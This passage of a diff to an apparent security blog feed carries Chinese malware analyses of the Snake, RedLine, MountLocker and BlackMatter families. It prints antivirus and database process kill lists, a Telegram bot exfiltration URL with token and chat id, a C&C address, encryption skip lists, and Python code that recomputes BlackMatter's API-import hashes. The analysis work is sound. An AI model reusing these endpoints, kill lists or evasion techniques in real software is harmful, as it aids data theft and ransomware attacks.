Auto-Protect&#34;,&#34;norton_av&#34;,&#34;nortonav&#34;,&#34;ccsetmgr&#34;,&#34;ccevtmgr&#34;,&#34;avadmin&#34;,&#34;avcenter&#34;,&#34;avgnt&#34;,&#34;avguard&#34;,&#34;avnotify&#34;,&#34;avscan&#34;,&#34;guardgui&#34;,&#34;nod32krn&#34;,&#34;nod32kui&#34;,&#34;clamscan&#34;,&#34;clamTray&#34;,&#34;clamWin&#34;,&#34;freshclam&#34;,&#34;oladdin&#34;,&#34;sigtool&#34;,&#34;w9xpopen&#34;,&#34;Wclose&#34;,&#34;cmgrdian&#34;,&#34;alogserv&#34;,&#34;mcshield&#34;,&#34;vshwin32&#34;,&#34;avconsol&#34;,&#34;vsstat&#34;,&#34;avsynmgr&#34;,&#34;avcmd&#34;,&#34;avconfig&#34;,&#34;licmgr&#34;,&#34;sched&#34;,&#34;preupd&#34;,&#34;MsMpEng&#34;,&#34;MSASCui&#34;,&#34;Avira.Systray&#34;
 </code></pre><p><img src="/snake_images/5608937186854.png" alt=""></p>
 <h4 id="353--定时截取屏幕">3.5.3.  定时截取屏幕</h4>
 <p>样本中的<code>Timer1</code>的功能是截取屏幕：</p>
@@ -728,12 +1374,10 @@
 <p>在该样本中，作者写定了传输方式：<code>private static string string_4 = &quot;$%TelegramDv$&quot;;</code></p>
 <p>最终获取到<code>Telegram</code>会话链接为：<code>https://api.telegram.org/bot1846952933:AAEgp2ulfucRILQNH4ZSk6CAr7cPDJZxCPs/sendDocument?chat_id=840259816&amp;caption=***</code></p>
 <h2 id="4-参考资料">4. 参考资料</h2>
-<blockquote>
-<p><a href="https://www.cybereason.com/blog/threat-analysis-report-snake-infostealer-malware">https://www.cybereason.com/blog/threat-analysis-report-snake-infostealer-malware</a>
-<a href="https://www.virustotal.com/gui/file/132482335f028ceb6094d9c29442faf900d838fb054eebbbf39208bb39ccf5ae">https://www.virustotal.com/gui/file/132482335f028ceb6094d9c29442faf900d838fb054eebbbf39208bb39ccf5ae</a>
-<a href="https://app.any.run/tasks/345a0eae-3a65-4b1a-9719-45a23c751f92/#">https://app.any.run/tasks/345a0eae-3a65-4b1a-9719-45a23c751f92/#</a></p>
-</blockquote>
-]]></content>
+<pre tabindex="0"><code>https://www.cybereason.com/blog/threat-analysis-report-snake-infostealer-malware
+https://www.virustotal.com/gui/file/132482335f028ceb6094d9c29442faf900d838fb054eebbbf39208bb39ccf5ae
+https://app.any.run/tasks/345a0eae-3a65-4b1a-9719-45a23c751f92/#
+</code></pre>]]></content>
 		</item>
 		
 		<item>
@@ -757,7 +1401,7 @@
 <p>后面会有动态解密过程，获取C&amp;C服务器地址端口：<code>45.9.20.182:52236</code></p>
 <p><img src="/redline_images/2791422189493.png" alt=""></p>
 <p>请求报文<code>header</code>格式如下：</p>
-<pre tabindex="0"><code>{&lt;Authorization xmlns=&quot;ns1&quot;&gt;a272f3a2850ec3dccdaed97234b7c40e&lt;/Authorization&gt;}
+<pre tabindex="0"><code>{&lt;Authorization xmlns=&#34;ns1&#34;&gt;a272f3a2850ec3dccdaed97234b7c40e&lt;/Authorization&gt;}
 </code></pre><p><img src="/redline_images/4782429177360.png" alt=""></p>
 <p>发送链接请求后等待服务器响应：</p>
 <p><img src="/redline_images/2256927187529.png" alt=""></p>
@@ -878,7 +1522,7 @@ pdadjkfkgcafgbceimcpbkalnfnepbnk|KardiaChain
 <p>当获取到上述数据后，会调用<code>Send()</code>函数，将扫描的详情进行填充，</p>
 <p><img src="/redline_images/5122110168522.png" alt=""></p>
 <p>其中<code>PartsSender.GetLocalInfo()</code>函数，会在主机上访问<code>http://733s.komawai.ru/</code>，该链接将返回主机的相关信息：</p>
-<pre tabindex="0"><code>{&quot;city&quot;:&quot;***&quot;,&quot;country_code&quot;:&quot;***&quot;,&quot;postal&quot;:null,&quot;ip&quot;:&quot;*.*.*.*&quot;}
+<pre tabindex="0"><code>{&#34;city&#34;:&#34;***&#34;,&#34;country_code&#34;:&#34;***&#34;,&#34;postal&#34;:null,&#34;ip&#34;:&#34;*.*.*.*&#34;}
 </code></pre><p>解析上述<code>json</code>文件，填充到发送请求中：</p>
 <p><img src="/redline_images/1305416169817.png" alt=""></p>
 <h3 id="24-远程下载">2.4. 远程下载</h3>
@@ -937,7 +1581,7 @@ pdadjkfkgcafgbceimcpbkalnfnepbnk|KardiaChain
 <p>然后进行列表比对，杀死指定进程</p>
 <p><img src="/mountlocker_images/2802719119999.png" alt=""></p>
 <p>进程列表如下：</p>
-<pre tabindex="0"><code>&quot;msftesql.exe&quot;、&quot;sqlagent.exe&quot;、&quot;sqlbrowser.exe&quot;、&quot;sqlwriter.exe&quot;、&quot;oracle.exe&quot;、&quot;ocssd.exe&quot;、&quot;dbsnmp.exe&quot;、&quot;synctime.exe&quot;、&quot;agntsvc.exe&quot;、&quot;isqlplussvc.exe&quot;、&quot;xfssvccon.exe&quot;、&quot;sqlservr.exe&quot;、&quot;mydesktopservice.exe&quot;、&quot;ocautoupds.exe&quot;、&quot;encsvc.exe&quot;、&quot;firefoxconfig.exe&quot;、&quot;tbirdconfig.exe&quot;、&quot;mydesktopqos.exe&quot;、&quot;ocomm.exe&quot;、&quot;mysqld.exe&quot;、&quot;mysqld-nt.exe&quot;、&quot;mysqld-opt.exe&quot;、&quot;dbeng50.exe&quot;、&quot;sqbcoreservice.exe&quot;、&quot;excel.exe&quot;、&quot;infopath.exe&quot;、&quot;msaccess.exe&quot;、&quot;mspub.exe&quot;、&quot;onenote.exe&quot;、&quot;outlook.exe&quot;、&quot;powerpnt.exe&quot;、&quot;sqlservr.exe&quot;、&quot;thebat.exe&quot;、&quot;steam.exe&quot;、&quot;thebat64.exe&quot;、&quot;thunderbird.exe&quot;、&quot;visio.exe&quot;、&quot;winword.exe&quot;、&quot;wordpad.exe&quot;、&quot;QBW32.exe&quot;、&quot;QBW64.exe&quot;、&quot;ipython.exe&quot;、&quot;wpython.exe&quot;、&quot;python.exe&quot;、&quot;dumpcap.exe&quot;、&quot;procmon.exe&quot;、&quot;procmon64.exe&quot;、&quot;procexp.exe&quot;、&quot;procexp64.exe&quot;
+<pre tabindex="0"><code>&#34;msftesql.exe&#34;、&#34;sqlagent.exe&#34;、&#34;sqlbrowser.exe&#34;、&#34;sqlwriter.exe&#34;、&#34;oracle.exe&#34;、&#34;ocssd.exe&#34;、&#34;dbsnmp.exe&#34;、&#34;synctime.exe&#34;、&#34;agntsvc.exe&#34;、&#34;isqlplussvc.exe&#34;、&#34;xfssvccon.exe&#34;、&#34;sqlservr.exe&#34;、&#34;mydesktopservice.exe&#34;、&#34;ocautoupds.exe&#34;、&#34;encsvc.exe&#34;、&#34;firefoxconfig.exe&#34;、&#34;tbirdconfig.exe&#34;、&#34;mydesktopqos.exe&#34;、&#34;ocomm.exe&#34;、&#34;mysqld.exe&#34;、&#34;mysqld-nt.exe&#34;、&#34;mysqld-opt.exe&#34;、&#34;dbeng50.exe&#34;、&#34;sqbcoreservice.exe&#34;、&#34;excel.exe&#34;、&#34;infopath.exe&#34;、&#34;msaccess.exe&#34;、&#34;mspub.exe&#34;、&#34;onenote.exe&#34;、&#34;outlook.exe&#34;、&#34;powerpnt.exe&#34;、&#34;sqlservr.exe&#34;、&#34;thebat.exe&#34;、&#34;steam.exe&#34;、&#34;thebat64.exe&#34;、&#34;thunderbird.exe&#34;、&#34;visio.exe&#34;、&#34;winword.exe&#34;、&#34;wordpad.exe&#34;、&#34;QBW32.exe&#34;、&#34;QBW64.exe&#34;、&#34;ipython.exe&#34;、&#34;wpython.exe&#34;、&#34;python.exe&#34;、&#34;dumpcap.exe&#34;、&#34;procmon.exe&#34;、&#34;procmon64.exe&#34;、&#34;procexp.exe&#34;、&#34;procexp64.exe&#34;
 </code></pre><p><img src="/mountlocker_images/4202625116554.png" alt=""></p>
 <h3 id="加密文件">加密文件</h3>
 <p>根据<code>/NOLOCK</code>参数，选择加密函数，默认是执行第一条：</p>
@@ -950,7 +1594,7 @@ pdadjkfkgcafgbceimcpbkalnfnepbnk|KardiaChain
 <p><code>ResultCheckDir</code>文件夹检查，如果满足以下要求，则跳过该文件夹（保留基础服务）：</p>
 <p><img src="/mountlocker_images/2884701155729.png" alt=""></p>
 <p>查看<code>off_14000A100</code>内容得出<code>black_list</code>文件列表如下：</p>
-<pre tabindex="0"><code>&quot;:\\Windows\\&quot;,&quot;:\\System Volume Information\\&quot;,&quot;:\\$RECYCLE.BIN\\&quot;,&quot;:\\SYSTEM.SAV&quot;,&quot;:\\WINNT&quot;,&quot;:\\$WINDOWS.~BT\\&quot;,&quot;:\\Windows.old\\&quot;,&quot;:\\PerfLog\\&quot;,&quot;:\\Boot&quot;,&quot;:\\ProgramData\\Microsoft\\&quot;,&quot;:\\ProgramData\\Packages\\&quot;,&quot;$\\Windows\\&quot;,&quot;$\\System Volume Information\\&quot;,&quot;$\\$RECYCLE.BIN\\&quot;,&quot;$\\SYSTEM.SAV&quot;,&quot;$\\WINNT&quot;,&quot;$\\$WINDOWS.~BT\\&quot;,&quot;$\\Windows.old\\&quot;,&quot;$\\PerfLog\\&quot;,&quot;$\\Boot&quot;,&quot;$\\ProgramData\\Microsoft\\&quot;,&quot;$\\ProgramData\\Packages\\&quot;,&quot;\\WindowsApps\\&quot;,&quot;\\Microsoft\\Windows\\&quot;,&quot;\\Local\\Packages\\&quot;,&quot;\\Windows Defender&quot;,&quot;\\microsoft shared\\&quot;,&quot;\\Google\\Chrome\\&quot;,&quot;\\Mozilla Firefox\\&quot;,&quot;\\Mozilla\\Firefox\\&quot;,&quot;\\Internet Explorer\\&quot;,&quot;\\MicrosoftEdge\\&quot;,&quot;\\Tor Browser\\&quot;,&quot;\\AppData\\Local\\Temp\\&quot;
+<pre tabindex="0"><code>&#34;:\\Windows\\&#34;,&#34;:\\System Volume Information\\&#34;,&#34;:\\$RECYCLE.BIN\\&#34;,&#34;:\\SYSTEM.SAV&#34;,&#34;:\\WINNT&#34;,&#34;:\\$WINDOWS.~BT\\&#34;,&#34;:\\Windows.old\\&#34;,&#34;:\\PerfLog\\&#34;,&#34;:\\Boot&#34;,&#34;:\\ProgramData\\Microsoft\\&#34;,&#34;:\\ProgramData\\Packages\\&#34;,&#34;$\\Windows\\&#34;,&#34;$\\System Volume Information\\&#34;,&#34;$\\$RECYCLE.BIN\\&#34;,&#34;$\\SYSTEM.SAV&#34;,&#34;$\\WINNT&#34;,&#34;$\\$WINDOWS.~BT\\&#34;,&#34;$\\Windows.old\\&#34;,&#34;$\\PerfLog\\&#34;,&#34;$\\Boot&#34;,&#34;$\\ProgramData\\Microsoft\\&#34;,&#34;$\\ProgramData\\Packages\\&#34;,&#34;\\WindowsApps\\&#34;,&#34;\\Microsoft\\Windows\\&#34;,&#34;\\Local\\Packages\\&#34;,&#34;\\Windows Defender&#34;,&#34;\\microsoft shared\\&#34;,&#34;\\Google\\Chrome\\&#34;,&#34;\\Mozilla Firefox\\&#34;,&#34;\\Mozilla\\Firefox\\&#34;,&#34;\\Internet Explorer\\&#34;,&#34;\\MicrosoftEdge\\&#34;,&#34;\\Tor Browser\\&#34;,&#34;\\AppData\\Local\\Temp\\&#34;
 </code></pre><p>数据文件夹<code>&quot;Program Files&quot;</code>，<code>&quot;Program Files (x86)&quot;</code>，<code>&quot;ProgramData&quot;</code>，<code>&quot;SQL&quot;</code>：</p>
 <p><img src="/mountlocker_images/2166505156338.png" alt=""></p>
 <p><code>ResultCheckFile</code>文件名检查如下，如果文件小于最小，大于最大，或者是指定后缀名则跳过该文件：</p>
@@ -958,7 +1602,7 @@ pdadjkfkgcafgbceimcpbkalnfnepbnk|KardiaChain
 <p>后缀名检查如下：</p>
 <p><img src="/mountlocker_images/5143325151055.png" alt=""></p>
 <p>查看数组可知<code>suffix_list</code>如下：</p>
-<pre tabindex="0"><code>&quot;exe&quot;,&quot;dll&quot;,&quot;sys&quot;,&quot;msi&quot;,&quot;mui&quot;,&quot;inf&quot;,&quot;cat&quot;,&quot;bat&quot;,&quot;cmd&quot;,&quot;ps1&quot;,&quot;vbs&quot;,&quot;ttf&quot;,&quot;fon&quot;,&quot;lnk&quot;
+<pre tabindex="0"><code>&#34;exe&#34;,&#34;dll&#34;,&#34;sys&#34;,&#34;msi&#34;,&#34;mui&#34;,&#34;inf&#34;,&#34;cat&#34;,&#34;bat&#34;,&#34;cmd&#34;,&#34;ps1&#34;,&#34;vbs&#34;,&#34;ttf&#34;,&#34;fon&#34;,&#34;lnk&#34;
 </code></pre><p>然后扫描文件，以<code>FindFirstFileW</code>和<code>FindNextFileW</code>来查找文件， 循环调用以确保所有文件夹都被扫描到：</p>
 <p><img src="/mountlocker_images/1884021169047.png" alt=""></p>
 <h4 id="文件加密流程">文件加密流程</h4>
@@ -1032,37 +1676,37 @@ del %0
 <p><code>hash</code>计算采用了循环右移<code>0xD</code>位的方式，<code>Get_Dll_Name_Hash</code>函数内容如下：</p>
 <p><img src="/blackmatter_images/1502623187424.png" alt=""></p>
 <p>采用<code>python</code>代码重写就美观了许多：</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">Calc_Dll_Hash</span><span class="p">(</span><span class="n">dll_name</span><span class="p">):</span>
-    <span class="n">mask</span> <span class="o">=</span> <span class="mh">0xFFFFFFFF</span>
-    <span class="n">result</span> <span class="o">=</span> <span class="mi">0</span>
-    <span class="k">for</span> <span class="n">each</span> <span class="ow">in</span> <span class="n">dll_name</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">:</span>
-        <span class="n">each</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">each</span><span class="p">)</span>
-        <span class="k">if</span><span class="p">(</span><span class="n">each</span> <span class="o">&gt;</span> <span class="mh">0x40</span> <span class="ow">and</span> <span class="n">each</span> <span class="o">&lt;</span> <span class="mh">0x5b</span><span class="p">):</span>
-            <span class="n">each</span> <span class="o">=</span> <span class="n">each</span> <span class="o">|</span> <span class="mh">0x20</span>
-        <span class="n">result</span> <span class="o">=</span> <span class="p">(</span><span class="n">result</span> <span class="o">&gt;&gt;</span> <span class="mh">0xd</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">result</span> <span class="o">&lt;&lt;</span> <span class="mh">0x13</span><span class="p">)</span>
-        <span class="n">result</span> <span class="o">=</span> <span class="p">(</span><span class="n">result</span><span class="o">+</span><span class="n">each</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">mask</span>
-    <span class="k">return</span> <span class="n">result</span>
-</code></pre></div><p><code>Get_Func_Name_Hash</code>函数略有不同，但大同小异：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">Calc_Dll_Hash</span><span class="p">(</span><span class="n">dll_name</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">mask</span> <span class="o">=</span> <span class="mh">0xFFFFFFFF</span>
+</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">each</span> <span class="ow">in</span> <span class="n">dll_name</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">each</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">each</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="n">each</span> <span class="o">&gt;</span> <span class="mh">0x40</span> <span class="ow">and</span> <span class="n">each</span> <span class="o">&lt;</span> <span class="mh">0x5b</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">            <span class="n">each</span> <span class="o">=</span> <span class="n">each</span> <span class="o">|</span> <span class="mh">0x20</span>
+</span></span><span class="line"><span class="cl">        <span class="n">result</span> <span class="o">=</span> <span class="p">(</span><span class="n">result</span> <span class="o">&gt;&gt;</span> <span class="mh">0xd</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">result</span> <span class="o">&lt;&lt;</span> <span class="mh">0x13</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">result</span> <span class="o">=</span> <span class="p">(</span><span class="n">result</span><span class="o">+</span><span class="n">each</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">mask</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">result</span>
+</span></span></code></pre></div><p><code>Get_Func_Name_Hash</code>函数略有不同，但大同小异：</p>
 <p><img src="/blackmatter_images/1134525180093.png" alt=""></p>
 <p><code>python</code>代码如下：</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">Calc_Func_Hash</span><span class="p">(</span><span class="n">dll_name</span><span class="p">,</span> <span class="n">func_name</span><span class="p">):</span>
-    <span class="n">mask</span> <span class="o">=</span> <span class="mh">0xFFFFFFFF</span>
-    <span class="n">result</span> <span class="o">=</span> <span class="n">dll_name</span>
-    <span class="k">for</span> <span class="n">each</span> <span class="ow">in</span> <span class="n">func_name</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">:</span>
-        <span class="n">each</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">each</span><span class="p">)</span>
-        <span class="n">result</span> <span class="o">=</span> <span class="p">(</span><span class="n">result</span> <span class="o">&gt;&gt;</span> <span class="mh">0xd</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">result</span> <span class="o">&lt;&lt;</span> <span class="mh">0x13</span><span class="p">)</span>
-        <span class="n">result</span> <span class="o">=</span> <span class="p">(</span><span class="n">result</span><span class="o">+</span><span class="n">each</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">mask</span>
-    <span class="k">return</span> <span class="n">result</span>
-</code></pre></div><p><strong>检验代码的有效性</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">Calc_Func_Hash</span><span class="p">(</span><span class="n">dll_name</span><span class="p">,</span> <span class="n">func_name</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">mask</span> <span class="o">=</span> <span class="mh">0xFFFFFFFF</span>
+</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="n">dll_name</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">each</span> <span class="ow">in</span> <span class="n">func_name</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">each</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">each</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">result</span> <span class="o">=</span> <span class="p">(</span><span class="n">result</span> <span class="o">&gt;&gt;</span> <span class="mh">0xd</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">result</span> <span class="o">&lt;&lt;</span> <span class="mh">0x13</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">result</span> <span class="o">=</span> <span class="p">(</span><span class="n">result</span><span class="o">+</span><span class="n">each</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">mask</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">result</span>
+</span></span></code></pre></div><p><strong>检验代码的有效性</strong></p>
 <p>实际上要调用的函数散列可以如下这般进行计算：</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="n">dll_name</span> <span class="o">=</span> <span class="s2">&#34;kernel32.dll&#34;</span>
-<span class="n">func_name</span> <span class="o">=</span> <span class="s2">&#34;LoadLibraryA&#34;</span>
-<span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">Calc_Func_Hash</span><span class="p">(</span><span class="n">Calc_Dll_Hash</span><span class="p">(</span><span class="n">dll_name</span><span class="p">),</span> <span class="n">func_name</span><span class="p">)))</span>
-
-<span class="n">dll_name</span> <span class="o">=</span> <span class="s2">&#34;kernel32.dll&#34;</span>
-<span class="n">func_name</span> <span class="o">=</span> <span class="s2">&#34;GetProcAddress&#34;</span>
-<span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">Calc_Func_Hash</span><span class="p">(</span><span class="n">Calc_Dll_Hash</span><span class="p">(</span><span class="n">dll_name</span><span class="p">),</span> <span class="n">func_name</span><span class="p">)))</span>
-</code></pre></div><p>返回结果如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">dll_name</span> <span class="o">=</span> <span class="s2">&#34;kernel32.dll&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">func_name</span> <span class="o">=</span> <span class="s2">&#34;LoadLibraryA&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">Calc_Func_Hash</span><span class="p">(</span><span class="n">Calc_Dll_Hash</span><span class="p">(</span><span class="n">dll_name</span><span class="p">),</span> <span class="n">func_name</span><span class="p">)))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">dll_name</span> <span class="o">=</span> <span class="s2">&#34;kernel32.dll&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">func_name</span> <span class="o">=</span> <span class="s2">&#34;GetProcAddress&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">Calc_Func_Hash</span><span class="p">(</span><span class="n">Calc_Dll_Hash</span><span class="p">(</span><span class="n">dll_name</span><span class="p">),</span> <span class="n">func_name</span><span class="p">)))</span>
+</span></span></code></pre></div><p>返回结果如下：</p>
 <pre tabindex="0"><code>0x27d05eb2
 0xbb93705c
 </code></pre><p>实际上加载<code>LoadLibraryA</code>和<code>GetProcAddress</code>的<code>hash</code>确实如此：</p>
@@ -1073,27 +1717,27 @@ del %0
 <p>加载函数前有两个<code>push</code>，通过动态调试可以知道第一个<code>push</code>是加载函数存放起始地址，第二个<code>push</code>是需要解密的函数<code>hash</code>存放起始地址。简单调试后可以得到知道每个<code>dll</code>加载时的<code>hash</code></p>
 <p><img src="/blackmatter_images/3452450090969.png" alt=""></p>
 <p>可以检索一下所有的本地dll文件，计算hash进行比对，</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="nb">dict</span> <span class="o">=</span> <span class="p">{}</span>
-<span class="k">for</span> <span class="n">filename</span> <span class="ow">in</span> <span class="n">os</span><span class="o">.</span><span class="n">listdir</span><span class="p">(</span><span class="s2">&#34;C:</span><span class="se">\\</span><span class="s2">Windows</span><span class="se">\\</span><span class="s2">System32&#34;</span><span class="p">):</span>
-    <span class="k">if</span> <span class="s1">&#39;.dll&#39;</span> <span class="ow">in</span> <span class="n">filename</span><span class="p">:</span>
-        <span class="n">dll_hash</span> <span class="o">=</span> <span class="n">Calc_Dll_Hash</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>
-        <span class="n">dll_name</span> <span class="o">=</span> <span class="n">filename</span>
-        <span class="nb">dict</span><span class="p">[</span><span class="nb">hex</span><span class="p">(</span><span class="n">dll_hash</span><span class="p">)</span><span class="o">.</span><span class="n">upper</span><span class="p">()</span> <span class="p">]</span> <span class="o">=</span> <span class="n">filename</span>
-<span class="nb">print</span><span class="p">(</span><span class="s1">&#39;411677B7:&#39;</span><span class="o">+</span><span class="nb">dict</span><span class="p">[</span><span class="s1">&#39;0X411677B7&#39;</span><span class="p">])</span>
-<span class="nb">print</span><span class="p">(</span><span class="s1">&#39;B1FC7F66:&#39;</span><span class="o">+</span><span class="nb">dict</span><span class="p">[</span><span class="s1">&#39;0XB1FC7F66&#39;</span><span class="p">])</span>
-<span class="nb">print</span><span class="p">(</span><span class="s1">&#39;BCFA1667:&#39;</span><span class="o">+</span><span class="nb">dict</span><span class="p">[</span><span class="s1">&#39;0XBCFA1667&#39;</span><span class="p">])</span>
-<span class="nb">print</span><span class="p">(</span><span class="s1">&#39;7132A177:&#39;</span><span class="o">+</span><span class="nb">dict</span><span class="p">[</span><span class="s1">&#39;0X7132A177&#39;</span><span class="p">])</span>
-<span class="nb">print</span><span class="p">(</span><span class="s1">&#39;3032403A:&#39;</span><span class="o">+</span><span class="nb">dict</span><span class="p">[</span><span class="s1">&#39;0X3032403A&#39;</span><span class="p">])</span>
-<span class="nb">print</span><span class="p">(</span><span class="s1">&#39;391830B4:&#39;</span><span class="o">+</span><span class="nb">dict</span><span class="p">[</span><span class="s1">&#39;0X391830B4&#39;</span><span class="p">])</span>
-<span class="nb">print</span><span class="p">(</span><span class="s1">&#39;38327FBA:&#39;</span><span class="o">+</span><span class="nb">dict</span><span class="p">[</span><span class="s1">&#39;0X38327FBA&#39;</span><span class="p">])</span>
-<span class="nb">print</span><span class="p">(</span><span class="s1">&#39;C50C676F:&#39;</span><span class="o">+</span><span class="nb">dict</span><span class="p">[</span><span class="s1">&#39;0XC50C676F&#39;</span><span class="p">])</span>
-<span class="nb">print</span><span class="p">(</span><span class="s1">&#39;820A18A3:&#39;</span><span class="o">+</span><span class="nb">dict</span><span class="p">[</span><span class="s1">&#39;0X820A18A3&#39;</span><span class="p">])</span>
-<span class="nb">print</span><span class="p">(</span><span class="s1">&#39;FD1A17C6:&#39;</span><span class="o">+</span><span class="nb">dict</span><span class="p">[</span><span class="s1">&#39;0XFD1A17C6&#39;</span><span class="p">])</span>
-<span class="nb">print</span><span class="p">(</span><span class="s1">&#39;41E8A017:&#39;</span><span class="o">+</span><span class="nb">dict</span><span class="p">[</span><span class="s1">&#39;0X41E8A017&#39;</span><span class="p">])</span>
-<span class="nb">print</span><span class="p">(</span><span class="s1">&#39;3CFC1737:&#39;</span><span class="o">+</span><span class="nb">dict</span><span class="p">[</span><span class="s1">&#39;0X3CFC1737&#39;</span><span class="p">])</span>
-<span class="nb">print</span><span class="p">(</span><span class="s1">&#39;C3BC5607:&#39;</span><span class="o">+</span><span class="nb">dict</span><span class="p">[</span><span class="s1">&#39;0XC3BC5607&#39;</span><span class="p">])</span>
-<span class="nb">print</span><span class="p">(</span><span class="s1">&#39;76E87915:&#39;</span><span class="o">+</span><span class="nb">dict</span><span class="p">[</span><span class="s1">&#39;0X76E87915&#39;</span><span class="p">])</span>
-</code></pre></div><p>最终计算结果如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="nb">dict</span> <span class="o">=</span> <span class="p">{}</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">filename</span> <span class="ow">in</span> <span class="n">os</span><span class="o">.</span><span class="n">listdir</span><span class="p">(</span><span class="s2">&#34;C:</span><span class="se">\\</span><span class="s2">Windows</span><span class="se">\\</span><span class="s2">System32&#34;</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="s1">&#39;.dll&#39;</span> <span class="ow">in</span> <span class="n">filename</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">dll_hash</span> <span class="o">=</span> <span class="n">Calc_Dll_Hash</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">dll_name</span> <span class="o">=</span> <span class="n">filename</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">dict</span><span class="p">[</span><span class="nb">hex</span><span class="p">(</span><span class="n">dll_hash</span><span class="p">)</span><span class="o">.</span><span class="n">upper</span><span class="p">()</span> <span class="p">]</span> <span class="o">=</span> <span class="n">filename</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;411677B7:&#39;</span><span class="o">+</span><span class="nb">dict</span><span class="p">[</span><span class="s1">&#39;0X411677B7&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;B1FC7F66:&#39;</span><span class="o">+</span><span class="nb">dict</span><span class="p">[</span><span class="s1">&#39;0XB1FC7F66&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;BCFA1667:&#39;</span><span class="o">+</span><span class="nb">dict</span><span class="p">[</span><span class="s1">&#39;0XBCFA1667&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;7132A177:&#39;</span><span class="o">+</span><span class="nb">dict</span><span class="p">[</span><span class="s1">&#39;0X7132A177&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;3032403A:&#39;</span><span class="o">+</span><span class="nb">dict</span><span class="p">[</span><span class="s1">&#39;0X3032403A&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;391830B4:&#39;</span><span class="o">+</span><span class="nb">dict</span><span class="p">[</span><span class="s1">&#39;0X391830B4&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;38327FBA:&#39;</span><span class="o">+</span><span class="nb">dict</span><span class="p">[</span><span class="s1">&#39;0X38327FBA&#39;</span><span class="p">])</span>
